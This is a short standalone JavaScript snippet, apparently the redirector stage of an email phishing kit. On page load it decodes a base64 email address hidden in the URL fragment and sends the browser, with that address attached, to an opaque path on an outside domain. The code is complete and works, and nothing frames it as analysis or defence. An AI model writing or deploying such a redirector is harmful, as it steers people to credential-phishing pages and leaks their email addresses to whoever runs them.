<script>
  window.addEventListener('DOMContentLoaded', () => {
    const hash = window.location.hash; // e.g. "#GJ1IS60VFamily=BASE64"

    // Remove the leading '#' and look for 'Family=' anywhere in the string
    const cleanedHash = hash.substring(1); // remove '#'

    const match = cleanedHash.match(/Family=([A-Za-z0-9+/=]+)/);
    if (match && match[1]) {
      try {
        const base64String = match[1];
        const decodedEmail = atob(base64String);
        const redirectUrl = "https://colorinline.com/875369473657863927734627963426597834523452345/#" + encodeURIComponent(decodedEmail);
        window.location.href = redirectUrl;
      } catch (error) {
        console.error("Base64 decoding failed:", error);
      }
    } else {
      console.error("No valid Family parameter found in hash");
    }
  });
</script>